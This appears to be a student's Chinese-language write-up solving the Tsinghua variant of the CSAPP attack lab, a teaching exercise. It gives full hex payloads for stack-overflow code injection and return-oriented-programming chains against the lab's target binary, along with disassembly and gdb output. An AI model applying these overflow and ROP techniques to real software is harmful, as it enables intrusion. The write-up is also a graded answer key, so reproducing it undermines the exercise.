# csapp-attacklab
# 此为清华版csapp attacklab的解答，与cmu的原始版本相比，需要多考虑返回地址的16字节对齐机制，所以任务1,2,3构造的字符串需要多插入一个ret的地址
##  1
test 对应的汇编代码
```
0000000000401e80 <getbuf>:
  401e80:	f3 0f 1e fa          	endbr64 
  401e84:	48 83 ec 28          	sub    $0x28,%rsp
  401e88:	48 89 e7             	mov    %rsp,%rdi
  401e8b:	e8 b6 02 00 00       	callq  402146 <Gets>
  401e90:	b8 01 00 00 00       	mov    $0x1,%eax
  401e95:	48 83 c4 28          	add    $0x28,%rsp
  401e99:	c3                   	retq   
  ```
sub    $0x28,%rsp可知压了40字节栈
```
0000000000401e9a <touch1>:
```
touch1的地址为401e9a，所以需要修改返回地址为 9A 1E 40 00 00 00 00 00
x86-64 ABI 规定，在执⾏ call 指令之前，堆栈指针 %rsp 必须是 16字节对⻬的
所以需要再压8字节ret的地址，找到一个ret地址为00401e7a
最终构造的字符串16进制表示为
```
40个00
7A 1E 40 00 00 00 00 00
9A 1E 40 00 00 00 00 00
```
## 2
```
1 void touch2(unsigned val)
2 {
3 vlevel = 2; /* Part of validation protocol */
4 if (val == cookie) {
5 printf("Touch2!: You called touch2(0x%.8x)\n", val);
6 validate(2);
7 } else {
8 printf("Misfire: You called touch2(0x%.8x)\n", val);
9 fail(2);
10 }
11 exit(0);
12 }
```
阅读touch2代码可知需要在调用touch2之前将%rdi的值设置为cookie的值
通过gdb调试
```
(gdb) print/x cookie
$2 = 0x4876cd33
```
得知cookie的值为0x4876cd33
touch2的地址为0x401ece
因此我们需要注入的代码为
```
assist.S:
movq $0x4876cd33, %rdi
pushq $0x401ece
ret
```
通过汇编与反汇编
```
g++ -c assist.S
objdump -d assist.o > assist.d
```
得到注入代码对应的机器码
```
0000000000000000 <.text>:
   0:	48 c7 c7 33 cd 76 48 	mov    $0x4876cd33,%rdi
   7:	68 ce 1e 40 00       	push   $0x401ece
   c:	c3                   	ret    
```
所以输入字符串的前几位为机器码48 c7 c7 33 cd 76 48 68 ce 1e 40 00 c3，之后通过00补齐到40位，最后同第一题一样压入ret地址和注入代码的地址，即getbuf的栈顶
```
(gdb) print/x $rsp
$3 = 0x5565aa90
```
通过gdb调试可知栈顶为 0x5565aa90
最后构造的16进制字符串为
```
48 c7 c7 33 cd 76 48 68
ce 1e 40 00 c3 00 00 00 //传入汇编代码的机器码
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
7A 1E 40 00 00 00 00 00 //插入ret指令避免segmentation fault
90 AA 65 55 00 00 00 00 //getbuf栈顶位置，也是传入代码的位置
```
## 3
```
1 /* Compare string to hex represention of unsigned value */
2 int hexmatch(unsigned val, char *sval)
3 {
4 char cbuf[110];
5 /* Make position of check string unpredictable */
6 char *s = cbuf + random() % 100;
7 sprintf(s, "%.8x", val);
8 return strncmp(sval, s, 9) == 0;
9 }
10
11 void touch3(char *sval)
12 {
13 vlevel = 3; /* Part of validation protocol */
14 if (hexmatch(cookie, sval)) {
15 printf("Touch3!: You called touch3(\"%s\")\n", sval);
16 validate(3);
17 } else {
18 printf("Misfire: You called touch3(\"%s\")\n", sval);
19 fail(3);
20 }
21 exit(0);
22 }
```
分析代码可知我们需要传入touch3一个字符串，与cookie对应的字符串相等
cookie的值为0x4876cd33
对应的字符串转化为ascii为34 38 37 36 63 64 33 33
通过gdb找到test运行getbuf前的rsp位置
```
(gdb) p/x $rsp
$1 = 0x5565aac0
```
在运行getbuf后由于%rsp需要16字节对齐，需要插入8字节的ret指令，所以我们将字符串34 38 37 36 63 64 33 33通过栈溢出存在rsp+8=0x5565aac8的位置
我们在调用touch3的时候将字符串的地址0x5565aac8传递给%rdi从而使hexmatch成功
touch3的地址为0x401ff4
类似上一题
我们需要注入的代码
```
assist.S:
movq $0x5565aac8, %rdi
pushq $0x401ff4
ret
```
通过汇编与反汇编得到对应的机器码
```
0000000000000000 <.text>:
   0:	48 c7 c7 c8 aa 65 55 	mov    $0x5565aac8,%rdi
   7:	68 f4 1f 40 00       	push   $0x401ff4
   c:	c3                   	ret    
```
因此我们构造的16进制字符串为
```
48 c7 c7 c8 aa 65 55 68
f4 1f 40 00 c3 00 00 00 //传入汇编代码的机器码
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
7A 1E 40 00 00 00 00 00 //插入ret指令避免segmentation fault
90 AA 65 55 00 00 00 00 //getbuf栈顶位置，也是传入代码的位置
34 38 37 36 63 64 33 33 //cookie对应的16进制字符串
```
## 4
与第二题一样，通过gdb调试
```
(gdb) print/x cookie
$2 = 0x4876cd33
```
得知cookie的值为0x4876cd33
我们需要通过gadget把%rdi的值设为cookie的值
有两种改变%rdi的操作：
```
1:popq   %rdi           5f
2:movq   %***， %rdi     48 89 **
```
经检索在start_farm 到mid_farm中不含5f
所以只能通过movq   %***，   %rdi赋值给%rdi
发现gadget
```
00004020c2 <setval_481>:
  4020c2:	f3 0f 1e fa          	endbr64 
  4020c6:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4020cc:	c3                   	ret    
```
中48 89 c7 90 c3  对应地址为4020c8
```
movq %rax, %rdi
ret
```
我们只需要把cookie的值传给rax，之后再调用movq %rax, %rdi即可把cookie的值传给%rdi
```
00004020ae <getval_345>:
  4020ae:	f3 0f 1e fa          	endbr64 
  4020b2:	b8 60 16 af 58       	mov    $0x58af1660,%eax
  4020b7:	c3                   	ret  
  ```
  其中
  ```
  58 popq %rax
  c3 req
  ```
  符合要求,对应地址为4020b6
  同任务2得touch2的地址为0x401ece
  我们最后构造的字符串为
  ```
40个00
B6 20 40 00 00 00 00 00         //gadget1 地址(popq %rax)
33 CD 76 48 00 00 00 00         //cookie的值
C8 20 40 00 00 00 00 00         //gadget2 地址(movq %rax, %rdi)
CE 1E 40 00 00 00 00 00         //touch2地址
  ```
## 5
同3一样，我们需要将cookie对应的字符串传递给touch3.
```
0000000000402115 <setval_453>:
  402115:	f3 0f 1e fa          	endbr64 
  402119:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  40211f:	c3                   	ret    
```
可提取gadget 1
```
gadget1  40211b
48 89 e0 90    movq  %rsp，  %rax
c3             ret
```
从
```
00004020ed <getval_337>:
  4020ed:	f3 0f 1e fa          	endbr64 
  4020f1:	b8 48 89 c7 91       	mov    $0x91c78948,%eax
  4020f6:	c3                   	ret 
```
可提取gadget2
```
gadget2  4020f2
48 89 c7          movq   %rax,  %rdi
91                xchg   %eax,%ecx(无影响)
c3                ret
```
从
```
00004020ae <getval_345>:
  4020ae:	f3 0f 1e fa          	endbr64 
  4020b2:	b8 60 16 af 58       	mov    $0x58af1660,%eax
  4020b7:	c3                   	ret  
  ``` 
可提取gadget3
  ```
  gadget3 4020b6
  58              popq %rax
  c3              req
  ```
<!-- 从
```
0000000000402134 <setval_417>:
  402134:	f3 0f 1e fa          	endbr64 
  402138:	c7 07 12 c1 89 ca    	movl   $0xca89c112,(%rdi)
  40213e:	c3                
  ```
可提取gadget4
```
gadget4  40213c
89 ca          movl   %eax, %edx
c3             ret
``` -->
<!-- 从
```
0000000000402115 <setval_453>:
  402115:	f3 0f 1e fa          	endbr64 
  402119:	c7 07 48 89 e0 90    	movl   $0x90e08948,(%rdi)
  40211f:	c3                   	ret    
```
可提取gadget4
```
89 e0 90       movl  %esp, %eax
c3             ret
``` -->
<!-- 从
```
00000000004020c2 <setval_481>:
  4020c2:	f3 0f 1e fa          	endbr64 
  4020c6:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4020cc:	c3                   	ret    

```
可提取gadget5
```
gadget5
89 c7 90       movl  %eax, %edi
c3             ret
``` -->
从
```
000000000040210a <addval_136>:
  40210a:	f3 0f 1e fa          	endbr64 
  40210e:	8d 87 89 c1 84 d2    	lea    -0x2d7b3e77(%rdi),%eax
  402114:	c3                   	ret    
```
可提取gadget
```
gadget 402110
89 c1          mov   %eax, %ecx
84 d2          test  %dl,  %dl
c3             ret
```
从
```
0000000000402134 <setval_417>:
  402134:	f3 0f 1e fa          	endbr64 
  402138:	c7 07 12 c1 89 ca    	movl   $0xca89c112,(%rdi)
  40213e:	c3             
```
可提取
```
gadget 40213c
89 ca       movl  %ecx, %edx
c3          ret
```
从
```
0000000000402120 <getval_393>:
  402120:	f3 0f 1e fa          	endbr64 
  402124:	b8 89 d6 28 c0       	mov    $0xc028d689,%eax
  402129:	c3                   	ret    
```
可提取
```
gadget   402125
89 d6       mov    %edx,%esi
28 c0       sub    %al,%al
c3          ret
```
从
```
0000000000402101 <add_xy>:
  402101:	f3 0f 1e fa          	endbr64 
  402105:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  402109:	c3                   	ret    
  ```
  可提取
  ```
  gadget 402105
  48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  c3                      ret
  ```
  我们构造字符串各部分的功能为
  ```
  40个00用以填满get_buf的缓冲区
  movq  %rsp，  %rax得到栈顶位置
  movq  %rax,  %rdi
  popq  %rax
  地址偏移量delta
 mov   %eax, %ecx
 movl  %ecx, %edx
 mov    %edx,%esi
 lea    (%rdi,%rsi,1),%rax
 movq  %rax,  %rdi
 touch3地址
 cookie对应的字符串
  ```
最终我们构造的字符串为
```
40个00
1b 21 40 00 00 00 00 00
f2 20 40 00 00 00 00 00
b6 20 40 00 00 00 00 00
48 00 00 00 00 00 00 00
10 21 40 00 00 00 00 00
3c 21 40 00 00 00 00 00
25 21 40 00 00 00 00 00
05 21 40 00 00 00 00 00
f2 20 40 00 00 00 00 00
f4 1f 40 00 00 00 00 00
34 38 37 36 63 64 33 33
```
